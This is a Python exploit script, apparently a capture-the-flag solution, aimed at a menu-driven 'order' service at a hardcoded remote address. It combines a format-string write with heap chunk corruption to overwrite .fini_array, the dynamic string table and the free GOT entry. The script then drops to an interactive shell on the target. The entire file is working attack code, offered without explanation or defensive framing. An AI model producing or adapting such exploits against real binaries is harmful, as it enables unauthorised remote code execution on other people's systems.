#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

host = "149.13.33.84"
#host = "10.211.55.16"
port = 1519
#port = 8888

sock = make_conn(host,port)

def edit1(sock,content):
    recvuntil(sock,"Submit")
    sendline(sock,"1")
    recvuntil(sock,"order:")
    sendline(sock,content)

def edit2(sock,content):
    recvuntil(sock,"Submit")
    sendline(sock,"2")
    recvuntil(sock,"order:")
    sendline(sock,content)

def delete1(sock):
    recvuntil(sock,"Submit")
    sendline(sock,"3")

def delete2(sock):
    recvuntil(sock,"Submit")
    sendline(sock,"4")


fini = 0x6011b8
dyn_str = 0x601250
free_got = 0x6013b8
free_plt = 0x4006b6
main = 0x400a39
fakestr = 0x601aa9
fmt = fmtchar(12,unpack32("sy\x00\x00"),13,2)
fmt += fmtchar(unpack32("sy\x00\x00"),unpack32("st\x00\x00"),14,2)
fmt += fmtchar(unpack32("st\x00\x00"),unpack32("em\x00\x00"),15,2)
fmt += fmtchar(unpack32("em\x00\x00"),0xa39,16,2)
fmt += fmtchar(0xa39,0x1aa9,17,2)
fmt += fmtchar(0x1aa9,0x60,18,2)
fmt += fmtchar(0x60,0x06b6,19,2)
fmt += fmtchar(0x06b6,0x40,20,2)
fmt += fmtchar(0x40,0,21,2)
exp = fmt.ljust(0x80,"a") + pack(0) + pack(0x151)
edit1(sock,exp)
exp = "a".ljust(0x140,"b") + pack(0) + pack(0x21) + "a"*0x10 +pack(0) + pack(0x21)
edit2(sock,exp)
delete2(sock)
recvuntil(sock,"Submit")
payload = "a"*8
payload += pack(0x601b20)
payload += pack(0x601b22)
payload += pack(0x601b24)
payload += pack(fini)
payload += pack(dyn_str)
payload += pack(dyn_str+2)
payload += pack(free_got)
payload += pack(free_got+2)
payload += pack(free_got+4)
sendline(sock,payload)
inter(sock)
